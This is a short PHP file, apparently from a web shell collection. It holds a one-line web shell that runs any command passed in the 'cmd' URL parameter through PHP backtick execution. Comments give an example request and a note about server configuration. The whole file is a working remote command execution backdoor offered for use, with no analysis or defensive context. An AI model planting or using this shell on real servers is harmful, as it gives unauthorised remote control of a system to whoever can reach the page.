# This will only work if the backticks are not disabled in the PHP configuration.
# Execution: http://example.com/webshell_backtricks.php?cmd=id

<?php echo `$_GET[cmd]`; ?>